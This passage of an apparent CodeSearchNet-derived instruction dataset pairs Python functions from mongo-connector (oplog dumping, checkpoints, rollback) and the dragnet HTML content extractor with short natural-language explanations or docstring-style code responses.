attempts += 1\n                    time.sleep(1)\n\n        def upsert_each(dm):\n            num_failed = 0\n            for namespace in dump_set:\n                from_coll = self.get_collection(namespace)\n                mapped_ns = self.namespace_config.map_namespace(namespace)\n                total_docs = retry_until_ok(from_coll.count)\n                num = None\n                for num, doc in enumerate(docs_to_dump(from_coll)):\n                    try:\n                        dm.upsert(doc, mapped_ns, long_ts)\n                    except Exception:\n                        if self.continue_on_error:\n                            LOG.exception(\"Could not upsert document: %r\" % doc)\n                            num_failed += 1\n                        else:\n                            raise\n                    if num % 10000 == 0:\n                        LOG.info(\n                            \"Upserted %d out of approximately %d docs \"\n                            \"from collection '%s'\",\n                            num + 1,\n                            total_docs,\n                            namespace,\n                        )\n                if num is not None:\n                    LOG.info(\n                        \"Upserted %d out of approximately %d docs from \"\n                        \"collection '%s'\",\n                        num + 1,\n                        total_docs,\n                        namespace,\n                    )\n            if num_failed > 0:\n                LOG.error(\"Failed to upsert %d docs\" % num_failed)\n\n        def upsert_all(dm):\n            try:\n                for namespace in dump_set:\n                    from_coll = self.get_collection(namespace)\n                    total_docs = retry_until_ok(from_coll.count)\n                    mapped_ns = self.namespace_config.map_namespace(namespace)\n                    LOG.info(\n                        \"Bulk upserting approximately %d docs from \" \"collection '%s'\",\n                        total_docs,\n                        namespace,\n                    )\n                    dm.bulk_upsert(docs_to_dump(from_coll), mapped_ns, long_ts)\n            except Exception:\n                if self.continue_on_error:\n                    LOG.exception(\n                        \"OplogThread: caught exception\"\n                        \" during bulk upsert, re-upserting\"\n                        \" documents serially\"\n                    )\n                    upsert_each(dm)\n                else:\n                    raise\n\n        def do_dump(dm, error_queue):\n            try:\n                LOG.debug(\n                    \"OplogThread: Using bulk upsert function for \" \"collection dump\"\n                )\n                upsert_all(dm)\n\n                if gridfs_dump_set:\n                    LOG.info(\n                        \"OplogThread: dumping GridFS collections: %s\", gridfs_dump_set\n                    )\n\n                # Dump GridFS files\n                for gridfs_ns in gridfs_dump_set:\n                    mongo_coll = self.get_collection(gridfs_ns)\n                    from_coll = self.get_collection(gridfs_ns + \".files\")\n                    dest_ns = self.namespace_config.map_namespace(gridfs_ns)\n                    for doc in docs_to_dump(from_coll):\n                        gridfile = GridFSFile(mongo_coll, doc)\n                        dm.insert_file(gridfile, dest_ns, long_ts)\n            except Exception:\n                # Likely exceptions:\n                # pymongo.errors.OperationFailure,\n                # mongo_connector.errors.ConnectionFailed\n                # mongo_connector.errors.OperationFailed\n                error_queue.put(sys.exc_info())\n\n        # Extra threads (if any) that assist with collection dumps\n        dumping_threads = []\n        # Did the dump succeed for all target systems?\n        dump_success = True\n        # Holds any exceptions we can't recover from\n        errors = queue.Queue()\n\n        if len(self.doc_managers) == 1:\n            do_dump(self.doc_managers[0], errors)\n        else:\n            # Slight performance gain breaking dump into separate\n            # threads if > 1 replication target\n            for dm in self.doc_managers:\n                t = threading.Thread(target=do_dump, args=(dm, errors))\n                dumping_threads.append(t)\n                t.start()\n            # cleanup\n            for t in dumping_threads:\n                t.join()\n\n        # Print caught exceptions\n        try:\n            while True:\n                LOG.critical(\n                    \"Exception during collection dump\", exc_info=errors.get_nowait()\n                )\n                dump_success = False\n        except queue.Empty:\n            pass\n\n        if not dump_success:\n            err_msg = \"OplogThread: Failed during dump collection\"\n            effect = \"cannot recover!\"\n            LOG.error(\"%s %s %s\" % (err_msg, effect, self.oplog))\n            self.running = False\n            return None\n\n        if dump_cancelled[0]:\n            LOG.warning(\n                \"Initial collection dump was interrupted. \"\n                \"Will re-run the collection dump on next startup.\"\n            )\n            return None\n\n        return timestamp"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_oplog_timestamp(self, newest_entry):\n        sort_order = pymongo.DESCENDING if newest_entry else pymongo.ASCENDING\n        curr = (\n            self.oplog.find({\"op\": {\"$ne\": \"n\"}}).sort(\"$natural\", sort_order).limit(-1)\n        )\n\n        try:\n            ts = next(curr)[\"ts\"]\n        except StopIteration:\n            LOG.debug(\"OplogThread: oplog is empty.\")\n            return None\n\n        LOG.debug(\n            \"OplogThread: %s oplog entry has timestamp %s.\"\n            % (\"Newest\" if newest_entry else \"Oldest\", ts)\n        )\n        return ts", "response": "Return the timestamp of the latest or earliest entry in the oplog."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef init_cursor(self):\n        timestamp = self.read_last_checkpoint()\n\n        if timestamp is None or self.only_dump:\n            if self.collection_dump:\n                # dump collection and update checkpoint\n                timestamp = self.dump_collection()\n                if self.only_dump:\n                    LOG.info(\"Finished dump. Exiting.\")\n                    timestamp = None\n                    self.running = False\n\n                self.update_checkpoint(timestamp)\n                if timestamp is None:\n                    return None, True\n            else:\n                # Collection dump disabled:\n                # Return cursor to beginning of oplog but do not set the\n                # checkpoint. The checkpoint will be set after an operation\n                # has been applied.\n                cursor = self.get_oplog_cursor()\n                return cursor, self._cursor_empty(cursor)\n\n        cursor = self.get_oplog_cursor(timestamp)\n        cursor_empty = self._cursor_empty(cursor)\n\n        if cursor_empty:\n            # rollback, update checkpoint, and retry\n            LOG.debug(\"OplogThread: Initiating rollback from \" \"get_oplog_cursor\")\n            self.update_checkpoint(self.rollback())\n            return self.init_cursor()\n\n        first_oplog_entry = next(cursor)\n\n        oldest_ts_long = util.bson_ts_to_long(self.get_oldest_oplog_timestamp())\n        checkpoint_ts_long = util.bson_ts_to_long(timestamp)\n        if checkpoint_ts_long < oldest_ts_long:\n            # We've fallen behind, the checkpoint has fallen off the oplog\n            return None, True\n\n        cursor_ts_long = util.bson_ts_to_long(first_oplog_entry[\"ts\"])\n        if cursor_ts_long > checkpoint_ts_long:\n            # The checkpoint is not present in this oplog and the oplog\n            # did not rollover. This means that we connected to a new\n            # primary which did not replicate the checkpoint and which has\n            # new changes in its oplog for us to process.\n            # rollback, update checkpoint, and retry\n            LOG.debug(\n                \"OplogThread: Initiating rollback from \"\n                \"get_oplog_cursor: new oplog entries found but \"\n                \"checkpoint is not present\"\n            )\n            self.update_checkpoint(self.rollback())\n            return self.init_cursor()\n\n        # first entry has been consumed\n        return cursor, cursor_empty", "response": "Initialize the cursor appropriately."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update_checkpoint(self, checkpoint):\n        if checkpoint is not None and checkpoint != self.checkpoint:\n            self.checkpoint = checkpoint\n            with self.oplog_progress as oplog_prog:\n                oplog_dict = oplog_prog.get_dict()\n                # If we have the repr of our oplog collection\n                # in the dictionary, remove it and replace it\n                # with our replica set name.\n                # This allows an easy upgrade path from mongo-connector 2.3.\n                # For an explanation of the format change, see the comment in\n                # read_last_checkpoint.\n                oplog_dict.pop(str(self.oplog), None)\n                oplog_dict[self.replset_name] = checkpoint\n                LOG.debug(\"OplogThread: oplog checkpoint updated to %s\", checkpoint)\n        else:\n            LOG.debug(\"OplogThread: no checkpoint to update.\")", "response": "Update the current checkpoint in the oplog progress dictionary."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef read_last_checkpoint(self):\n        # In versions of mongo-connector 2.3 and before,\n        # we used the repr of the\n        # oplog collection as keys in the oplog_progress dictionary.\n        # In versions thereafter, we use the replica set name. For backwards\n        # compatibility, we check for both.\n        oplog_str = str(self.oplog)\n\n        ret_val = None\n        with self.oplog_progress as oplog_prog:\n            oplog_dict = oplog_prog.get_dict()\n            try:\n                # New format.\n                ret_val = oplog_dict[self.replset_name]\n            except KeyError:\n                try:\n                    # Old format.\n                    ret_val = oplog_dict[oplog_str]\n                except KeyError:\n                    pass\n\n        LOG.debug(\"OplogThread: reading last checkpoint as %s \" % str(ret_val))\n        self.checkpoint = ret_val\n        return ret_val", "response": "Read the last checkpoint from the oplog progress dictionary."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef rollback(self):\n        # Find the most recently inserted document in each target system\n        LOG.debug(\n            \"OplogThread: Initiating rollback sequence to bring \"\n            \"system into a consistent state.\"\n        )\n        last_docs = []\n        for dm in self.doc_managers:\n            dm.commit()\n            last_docs.append(dm.get_last_doc())\n\n        # Of these documents, which is the most recent?\n        last_inserted_doc = max(\n            last_docs, key=lambda x: x[\"_ts\"] if x else float(\"-inf\")\n        )\n\n        # Nothing has been replicated. No need to rollback target systems\n        if last_inserted_doc is None:\n            return None\n\n        # Find the oplog entry that touched the most recent document.\n        # We'll use this to figure where to pick up the oplog later.\n        target_ts = util.long_to_bson_ts(last_inserted_doc[\"_ts\"])\n        last_oplog_entry = util.retry_until_ok(\n            self.oplog.find_one,\n            {\"ts\": {\"$lte\": target_ts}, \"op\": {\"$ne\": \"n\"}},\n            sort=[(\"$natural\", pymongo.DESCENDING)],\n        )\n\n        LOG.debug(\"OplogThread: last oplog entry is %s\" % str(last_oplog_entry))\n\n        # The oplog entry for the most recent document doesn't exist anymore.\n        # If we've fallen behind in the oplog, this will be caught later\n        if last_oplog_entry is None:\n            return None\n\n        # rollback_cutoff_ts happened *before* the rollback\n        rollback_cutoff_ts = last_oplog_entry[\"ts\"]\n        start_ts = util.bson_ts_to_long(rollback_cutoff_ts)\n        # timestamp of the most recent document on any target system\n        end_ts = last_inserted_doc[\"_ts\"]\n\n        for dm in self.doc_managers:\n            rollback_set = {}  # this is a dictionary of ns:list of docs\n\n            # group potentially conflicted documents by namespace\n            for doc in dm.search(start_ts, end_ts):\n                if doc[\"ns\"] in rollback_set:\n                    rollback_set[doc[\"ns\"]].append(doc)\n                else:\n                    rollback_set[doc[\"ns\"]] = [doc]\n\n            # retrieve these documents from MongoDB, either updating\n            # or removing them in each target system\n            for namespace, doc_list in rollback_set.items():\n                # Get the original namespace\n                original_namespace = self.namespace_config.unmap_namespace(namespace)\n                if not original_namespace:\n                    original_namespace = namespace\n\n                database, coll = original_namespace.split(\".\", 1)\n                obj_id = bson.objectid.ObjectId\n                bson_obj_id_list = [obj_id(doc[\"_id\"]) for doc in doc_list]\n\n                # Use connection to whole cluster if in sharded environment.\n                client = self.mongos_client or self.primary_client\n                to_update = util.retry_until_ok(\n                    client[database][coll].find,\n                    {\"_id\": {\"$in\": bson_obj_id_list}},\n                    projection=self.namespace_config.projection(original_namespace),\n                )\n                # Doc list are docs in target system, to_update are\n                # Docs in mongo\n                doc_hash = {}  # Hash by _id\n                for doc in doc_list:\n                    doc_hash[bson.objectid.ObjectId(doc[\"_id\"])] = doc\n\n                to_index = []\n\n                def collect_existing_docs():\n                    for doc in to_update:\n                        if doc[\"_id\"] in doc_hash:\n                            del doc_hash[doc[\"_id\"]]\n                            to_index.append(doc)\n\n                retry_until_ok(collect_existing_docs)\n\n                # Delete the inconsistent documents\n                LOG.debug(\"OplogThread: Rollback, removing inconsistent \" \"docs.\")\n                remov_inc = 0\n                for document_id in doc_hash:\n                    try:\n                        dm.remove(\n                            document_id,\n                            namespace,\n                            util.bson_ts_to_long(rollback_cutoff_ts),\n                        )\n                        remov_inc += 1\n                        LOG.debug(\"OplogThread: Rollback, removed %r \" % doc)\n                    except errors.OperationFailed:\n                        LOG.warning(\n                            \"Could not delete document during rollback: %r \"\n                            \"This can happen if this document was already \"\n                            \"removed by another rollback happening at the \"\n                            \"same time.\" % doc\n                        )\n\n                LOG.debug(\"OplogThread: Rollback, removed %d docs.\" % remov_inc)\n\n                # Insert the ones from mongo\n                LOG.debug(\"OplogThread: Rollback, inserting documents \" \"from mongo.\")\n                insert_inc = 0\n                fail_insert_inc = 0\n                for doc in to_index:\n                    try:\n                        insert_inc += 1\n                        dm.upsert(\n                            doc, namespace, util.bson_ts_to_long(rollback_cutoff_ts)\n                        )\n                    except errors.OperationFailed:\n                        fail_insert_inc += 1\n                        LOG.exception(\n                            \"OplogThread: Rollback, Unable to \" \"insert %r\" % doc\n                        )\n\n        LOG.debug(\n            \"OplogThread: Rollback, Successfully inserted %d \"\n            \" documents and failed to insert %d\"\n            \" documents.  Returning a rollback cutoff time of %s \"\n            % (insert_inc, fail_insert_inc, str(rollback_cutoff_ts))\n        )\n\n        return rollback_cutoff_ts", "response": "This method commits the target system into consistent state."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fit(self, documents, labels, weights=None):\n        block_groups = np.array([self.blockifier.blockify(doc) for doc in documents])\n        mask = [self._has_enough_blocks(blocks) for blocks in block_groups]\n        block_groups = block_groups[mask]\n        labels = np.concatenate(np.array(labels)[mask])\n\n        # TODO: This only 'fit's one doc at a time. No feature fitting actually\n        # happens for now, but this might be important if the features change\n        features_mat = np.concatenate([self.features.fit_transform(blocks)\n                                       for blocks in block_groups])\n        if weights is None:\n            self.model.fit(features_mat, labels)\n        else:\n            weights = np.concatenate(np.array(weights)[mask])\n            self.model.fit(features_mat, labels, sample_weight=weights)\n        return self", "response": "Fit features and model to a training dataset."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_html_labels_weights(self, data):\n        all_html = []\n        all_labels = []\n        all_weights = []\n        for html, content, comments in data:\n            all_html.append(html)\n            labels, weights = self._get_labels_and_weights(\n                content, comments)\n            all_labels.append(labels)\n            all_weights.append(weights)\n        return np.array(all_html), np.array(all_labels), np.array(all_weights)", "response": "Gather the html labels and weights of many files data."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_labels_and_weights(self, content, comments):\n        # extract content and comments\n        if 'content' in self.to_extract and 'comments' in self.to_extract:\n            labels = np.logical_or(content[0], comments[0]).astype(int)\n            weights = content[1],\n        # extract content only\n        elif 'content' in self.to_extract:\n            labels = content[0]\n            weights = content[1]\n        # extract comments only\n        else:\n            labels = comments[0]\n            weights = comments[1]\n        if self.max_block_weight is None:\n            weights = np.minimum(weights, self.max_block_weight)\n\n        return labels, weights", "response": "Returns the labels and weights for the current entry."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nextracting the main content and comments from an HTML document and returns it as a string or a list of blocks.", "response": "def extract(self, html, encoding=None, as_blocks=False):\n        \"\"\"\n        Extract the main content and/or comments from an HTML document and\n        return it as a string or as a sequence of block objects.\n\n        Args:\n            html (str): HTML document as a string.\n            encoding (str): Encoding of ``html``. If None (encoding unknown), the\n                original encoding will be guessed from the HTML itself.\n            as_blocks (bool): If False, return the main content as a combined\n                string; if True, return the content-holding blocks as a list of\n                block objects.\n\n        Returns:\n            str or List[Block]\n        \"\"\"\n        preds, blocks = self.predict(html, encoding=encoding, return_blocks=True)\n        if as_blocks is False:\n            return str_cast(b'\\n'.join(blocks[ind].text for ind in np.flatnonzero(preds)))\n        else:\n            return [blocks[ind] for ind in np.flatnonzero(preds)]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef predict(self, documents, **kwargs):\n        if isinstance(documents, (str, bytes, unicode_, np.unicode_)):\n            return self._predict_one(documents, **kwargs)\n        else:\n            return np.concatenate([self._predict_one(doc, **kwargs) for doc in documents])", "response": "Predicts the binary class of the blocks in one or many\n        HTML documents."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\npredicts one class of a single HTML document.", "response": "def _predict_one(self, document, encoding=None, return_blocks=False):\n        \"\"\"\n        Predict class (content=1 or not-content=0) of each block in an HTML\n        document.\n\n        Args:\n            documents (str): HTML document\n\n        Returns:\n            ``np.ndarray``: array of binary predictions for content (1) or\n            not-content (0).\n        \"\"\"\n        # blockify\n        blocks = self.blockifier.blockify(document, encoding=encoding)\n        # get features\n        try:\n            features = self.features.transform(blocks)\n        except ValueError: # Can't make features, predict no content\n            preds = np.zeros((len(blocks)))\n        # make predictions\n        else:\n            if self.prob_threshold is None:\n                preds = self.model.predict(features)\n            else:\n                self._positive_idx = (\n                    self._positive_idx or list(self.model.classes_).index(1))\n                preds = self.model.predict_proba(features) > self.prob_threshold\n                preds = preds[:, self._positive_idx].astype(int)\n\n        if return_blocks:\n            return preds, blocks\n        else:\n            return preds"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef fit(self, blocks, y=None):\n        feature_array = self.feature.fit_transform(blocks)\n        self.scaler = self.scaler.fit(feature_array)\n        return self", "response": "Fit the feature to the given list of blocks."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef transform(self, blocks, y=None):\n        return self.scaler.transform(self.feature.transform(blocks))", "response": "Transform an ordered sequence of blocks into a 2D features matrix with shape num blocks num features and standardized feature values."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfit a k - means clustering model using an ordered sequence of blocks.", "response": "def fit(self, blocks, y=None):\n        \"\"\"\n        Fit a k-means clustering model using an ordered sequence of blocks.\n        \"\"\"\n        self.kmeans.fit(make_weninger_features(blocks))\n        # set the cluster center closest to the origin to exactly (0.0, 0.0)\n        self.kmeans.cluster_centers_.sort(axis=0)\n        self.kmeans.cluster_centers_[0, :] = np.zeros(2)\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncomputing the content to tag ratio per block smooths the values then the k - means prediction of content.", "response": "def transform(self, blocks, y=None):\n        \"\"\"\n        Computes the content to tag ratio per block, smooths the values, then\n        predicts content (1) or not-content (0) using a fit k-means cluster model.\n\n        Args:\n            blocks (List[Block]): as output by :class:`Blockifier.blockify`\n            y (None): This isn't used, it's only here for API consistency.\n\n        Returns:\n            :class:`np.ndarray`: 2D array of shape (len(feature_mat), 1), where\n                values are either 0 or 1, corresponding to the kmeans prediction\n                of content (1) or not-content (0).\n        \"\"\"\n        preds = (self.kmeans.predict(make_weninger_features(blocks)) > 0).astype(int)\n        return np.reshape(preds, (-1, 1))"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ntransform an ordered sequence of blocks into a 2D features matrix with shape ( num blocks num features ) where each row is a tuple of the number of features that are present in the block.", "response": "def transform(self, blocks, y=None):\n        \"\"\"\n        Transform an ordered sequence of blocks into a 2D features matrix with\n        shape (num blocks, num features).\n\n        Args:\n            blocks (List[Block]): as output by :class:`Blockifier.blockify`\n            y (None): This isn't used, it's only here for API consistency.\n\n        Returns:\n            `np.ndarray`: 2D array of shape (num blocks, num CSS attributes),\n                where values are either 0 or 1, indicating the absence or\n                presence of a given token in a CSS attribute on a given block.\n        \"\"\"\n        feature_vecs = (\n            tuple(re.search(token, block.css[attrib]) is not None\n                  for block in blocks)\n            for attrib, tokens in self.attribute_tokens\n            for token in tokens\n            )\n        return np.column_stack(tuple(feature_vecs)).astype(int)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef evaluate_model_predictions(y_true, y_pred, weights=None):\n    if isinstance(y_pred[0], np.ndarray):\n        y_pred = np.concatenate(y_pred)\n    if isinstance(y_true[0], np.ndarray):\n        y_true = np.concatenate(y_true)\n    if (weights is not None) and (isinstance(weights[0], np.ndarray)):\n        weights = np.concatenate(weights)\n\n    accuracy = accuracy_score(\n        y_true, y_pred, normalize=True, sample_weight=weights)\n    precision = precision_score(\n        y_true, y_pred, average='binary', pos_label=1, sample_weight=weights)\n    recall = recall_score(\n        y_true, y_pred, average='binary', pos_label=1, sample_weight=weights)\n    f1 = f1_score(\n        y_true, y_pred, average='binary', pos_label=1, sample_weight=weights)\n    return {'accuracy': accuracy, 'precision': precision, 'recall': recall, 'f1': f1}", "response": "Evaluate the performance of an extractor model s binary classification\n    predictions."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nevaluates the similarity between gold - standard and extracted content and the base node of the node.", "response": "def evaluate_extracted_tokens(gold_content, extr_content):\n    \"\"\"\n    Evaluate the similarity between gold-standard and extracted content,\n    typically for a single HTML document, as another way of evaluating the\n    performance of an extractor model.\n\n    Args:\n        gold_content (str or Sequence[str]): Gold-standard content, either as a\n            string or as an already-tokenized list of tokens.\n        extr_content (str or Sequence[str]): Extracted content, either as a\n            string or as an already-tokenized list of tokens.\n\n    Returns:\n        Dict[str, float]\n    \"\"\"\n    if isinstance(gold_content, string_):\n        gold_content = simple_tokenizer(gold_content)\n    if isinstance(extr_content, string_):\n        extr_content = simple_tokenizer(extr_content)\n    gold_set = set(gold_content)\n    extr_set = set(extr_content)\n    jaccard = len(gold_set & extr_set) / len(gold_set | extr_set)\n    levenshtein = dameraulevenshtein(gold_content, extr_content)\n    return {'jaccard': jaccard, 'levenshtein': levenshtein}"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ntrain an extractor model on the data_dir and write the results to disk in output_dir.", "response": "def train_model(extractor, data_dir, output_dir=None):\n    \"\"\"\n    Train an extractor model, then write train/test block-level classification\n    performance as well as the model itself to disk in ``output_dir``.\n\n    Args:\n        extractor (:class:`Extractor`): Instance of the ``Extractor`` class to\n            be trained.\n        data_dir (str): Directory on disk containing subdirectories for all\n            training data, including raw html and gold standard blocks files\n        output_dir (str): Directory on disk to which the trained model files,\n            errors, etc. are to be written. If None, outputs are not saved.\n\n    Returns:\n        :class:`Extractor`: A trained extractor model.\n    \"\"\"\n    # set up directories and file naming\n    output_dir, fname_prefix = _set_up_output_dir_and_fname_prefix(output_dir, extractor)\n\n    # prepare and split the data\n    logging.info('preparing, splitting, and concatenating the data...')\n    data = prepare_all_data(data_dir)\n    training_data, test_data = train_test_split(\n        data, test_size=0.2, random_state=42)\n    train_html, train_labels, train_weights = extractor.get_html_labels_weights(training_data)\n    test_html, test_labels, test_weights = extractor.get_html_labels_weights(test_data)\n\n    # fit the extractor on training data\n    # then evaluate it on train and test data\n    logging.info('fitting and evaluating the extractor features and model...')\n    try:\n        extractor.fit(train_html, train_labels, weights=train_weights)\n    except (TypeError, ValueError):\n        extractor.fit(train_html, train_labels)\n    train_eval = evaluate_model_predictions(\n        np.concatenate(train_labels), extractor.predict(train_html),\n        np.concatenate(train_weights))\n    test_eval = evaluate_model_predictions(\n        np.concatenate(test_labels), extractor.predict(test_html),\n        np.concatenate(test_weights))\n\n    # report model performance\n    _report_model_performance(output_dir, fname_prefix, train_eval, test_eval)\n\n    # pickle the final model\n    _write_model_to_disk(output_dir, fname_prefix, extractor)\n\n    return extractor"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ntrains many extractor models then for the best - scoring model.", "response": "def train_many_models(extractor, param_grid, data_dir, output_dir=None,\n                      **kwargs):\n    \"\"\"\n    Train many extractor models, then for the best-scoring model, write\n    train/test block-level classification performance as well as the model itself\n    to disk in ``output_dir``.\n\n    Args:\n        extractor (:class:`Extractor`): Instance of the ``Extractor`` class to\n            be trained.\n        param_grid (dict or List[dict]): Dictionary with parameters names (str)\n            as keys and lists of parameter settings to try as values, or a list\n            of such dictionaries, in which case the grids spanned by each are\n            explored. See documentation for :class:`GridSearchCV` for details.\n        data_dir (str): Directory on disk containing subdirectories for all\n            training data, including raw html and gold standard blocks files\n        output_dir (str): Directory on disk to which the trained model files,\n            errors, etc. are to be written. If None, outputs are not saved.\n        **kwargs:\n            scoring (str or Callable): default 'f1'\n            cv (int): default 5\n            n_jobs (int): default 1\n            verbose (int): default 1\n\n    Returns:\n        :class:`Extractor`: The trained extractor model with the best-scoring\n            set of params.\n\n    See Also:\n        Documentation for grid search :class:`GridSearchCV` in ``scikit-learn``:\n            http://scikit-learn.org/stable/modules/generated/sklearn.model_selection.GridSearchCV.html\n    \"\"\"\n    # set up directories and file naming\n    output_dir, fname_prefix = _set_up_output_dir_and_fname_prefix(output_dir, extractor)\n\n    # prepare and split the data\n    logging.info('preparing and splitting the data...')\n    data = prepare_all_data(data_dir)\n    training_data, test_data = train_test_split(\n        data, test_size=0.2, random_state=42)\n    train_html, train_labels, train_weights = extractor.get_html_labels_weights(training_data)\n    test_html, test_labels, test_weights = extractor.get_html_labels_weights(test_data)\n\n    # filter docs we can't get features from\n    train_blocks = np.array([extractor.blockifier.blockify(doc)\n                            for doc in train_html])\n    train_mask = [extractor._has_enough_blocks(blocks) for blocks in train_blocks]\n    train_blocks = train_blocks[train_mask]\n    train_labels = np.concatenate(train_labels[train_mask])\n    train_weights = np.concatenate(train_weights[train_mask])\n    test_labels = np.concatenate(test_labels)\n    test_weights = np.concatenate(test_weights)\n    # get features\n    # TODO: This only 'fit's one doc at a time. No feature fitting actually\n    # happens for now, but this might be important if the features change\n    train_features = np.concatenate([extractor.features.fit_transform(blocks)\n                                    for blocks in train_blocks])\n\n    # fit many models\n    gscv = GridSearchCV(\n        extractor.model, param_grid, fit_params={'sample_weight': train_weights},\n        scoring=kwargs.get('scoring', 'f1'), cv=kwargs.get('cv', 5),\n        n_jobs=kwargs.get('n_jobs', 1), verbose=kwargs.get('verbose', 1))\n    gscv = gscv.fit(train_features, train_labels)\n\n    logging.info('Score of the best model, on left-out data: %s', gscv.best_score_)\n    logging.info('Params of the best model: %s', gscv.best_params_)\n\n    # evaluate best model on train and test data\n    extractor.model = gscv.best_estimator_\n    train_eval = evaluate_model_predictions(\n        train_labels, extractor.predict(train_html[train_mask]), weights=train_weights)\n    test_eval = evaluate_model_predictions(\n        test_labels, extractor.predict(test_html), weights=test_weights)\n\n    # pickle the final model\n    _write_model_to_disk(output_dir, fname_prefix, extractor)\n\n    return extractor"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nextracting the gold standard block-level content and comment percentages from a directory of labeled data (only those for which the gold standard blocks are not found), and save results to corresponding files in a block-level gold standard directory under ``data_dir``. Args: data_dir (str): Directory on disk containing subdirectories for all training data, including raw html files and gold standard content + comments text files nprocesses (int): If > 1, use a :class:`multiprocessing.Pool` to parallelize the extractions overwrite (bool): If True, overwrite existing gold-standard blocks files. **kwargs: passed into :func:`extract_gold_standard_blocks` See Also: :func:`extract_gold_standard_blocks`", "response": "def extract_all_gold_standard_data(data_dir, nprocesses=1,\n                                   overwrite=False, **kwargs):\n    \"\"\"\n    Extract the gold standard block-level content and comment percentages from a\n    directory of labeled data (only those for which the gold standard blocks are\n    not found), and save results to corresponding files in a block-level\n    gold standard directory under ``data_dir``.\n\n    Args:\n        data_dir (str): Directory on disk containing subdirectories for all\n            training data, including raw html files and gold standard content +\n            comments text files\n        nprocesses (int): If > 1, use a :class:`multiprocessing.Pool` to\n            parallelize the extractions\n        overwrite (bool): If True, overwrite existing gold-standard blocks files.\n        **kwargs: passed into :func:`extract_gold_standard_blocks`\n\n    See Also:\n        :func:`extract_gold_standard_blocks`\n    \"\"\"\n    use_pool = nprocesses > 1\n    if use_pool:\n        pool = multiprocessing.Pool(processes=nprocesses)\n\n    # get the set of files that have already been block corrected\n    # so that we don't block correct them again\n    if overwrite is False:\n        gs_blocks_dir = os.path.join(data_dir, GOLD_STANDARD_BLOCKS_DIRNAME)\n        if not os.path.isdir(gs_blocks_dir):\n            os.mkdir(gs_blocks_dir)\n        gs_blocks_filenames = get_filenames(\n            gs_blocks_dir, full_path=False, match_regex=re.escape(GOLD_STANDARD_BLOCKS_EXT))\n        gs_blocks_fileroots = {\n            re.search(r'(.+)' + re.escape(GOLD_STANDARD_BLOCKS_EXT), gs_blocks_filename).group(1)\n            for gs_blocks_filename in gs_blocks_filenames}\n    else:\n        gs_blocks_fileroots = set()\n\n    # extract the block-level gold parse from\n    # the set of files to be block corrected\n    gs_dir = os.path.join(data_dir, GOLD_STANDARD_DIRNAME)\n    gs_filenames = get_filenames(\n        gs_dir, full_path=False, match_regex=re.escape(GOLD_STANDARD_EXT))\n    for i, gs_filename in enumerate(gs_filenames):\n        gs_fileroot = re.search(r'(.+)' + re.escape(GOLD_STANDARD_EXT), gs_filename).group(1)\n        if gs_fileroot in gs_blocks_fileroots:\n            continue\n        if i % 100 == 0:\n            print('Extracting gold standard blocks for file \"{}\"'.format(gs_filename))\n        if use_pool:\n            pool.apply_async(extract_gold_standard_blocks, (data_dir, gs_fileroot), kwargs)\n        else:\n            extract_gold_standard_blocks(data_dir, gs_fileroot, **kwargs)\n\n    # close out our pool\n    if use_pool:\n        pool.close()\n        pool.join()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nextract the gold standard blocks for a single observation identified by fileroot and writes the results to file.", "response": "def extract_gold_standard_blocks(data_dir, fileroot, encoding=None,\n                                 tokenizer=simple_tokenizer, cetr=False):\n    \"\"\"\n    Extract the gold standard block-level content and comments for a single\n    observation identified by ``fileroot``, and write the results to file.\n\n    Args:\n        data_dir (str): The root directory containing sub-directories for\n            raw HTML, gold standard extracted content, and gold standard blocks.\n        fileroot (str): Unique identifier for a single observation of training\n            data, corresponding to the start of its raw html and gold standard\n            filenames under ``data_dir``.\n        encoding (str)\n        tokenizer (Callable): Object that takes a string and returns the tokens\n            as a list of strings.\n        cetr (bool): If True, parse the gold standard in clean eval format.\n\n    Notes:\n        Results are written to a text file in the block-level gold standard dir\n        :obj:`GOLD_STANDARD_BLOCKS_DIRNAME` below ``data_dir``. Each line\n        corresponds to a single block in its order of appearance, and has the\n        following format::\n\n            content_frac comments_frac all_tokens content_tokens comments_tokens\n\n        where each item is separated by a tab. ``content_frac`` is equal to the\n        fraction of ``all_tokens`` found in the corresponding gold parse content\n        text; ``comments_frac`` is the same but for comments text.\n    \"\"\"\n    # read the raw html, split it into blocks, and tokenize each block\n    raw_html = read_html_file(data_dir, fileroot, encoding=encoding)  # text is unicode\n    from dragnet.blocks import BlockifyError\n    try:\n        blocks = [b.text for b in Blockifier.blockify(raw_html)]  # text is bytes\n    except BlockifyError as e:\n        print('BlockifyError for file \"{}\"'.format(fileroot))\n        return\n    blocks_tokens = [tokenizer(block) for block in blocks]\n    num_blocks_tokens = [len(block_tokens) for block_tokens in blocks_tokens]\n\n    # solve the longest common subsequence problem to determine which blocks were kept\n    # need a list of all the tokens in the blocks, plus a correspondence of which\n    # block they belong to.\n    # we will determine which of the tokens is in the extracted content,\n    # then use the correspondence to block id to determine which blocks 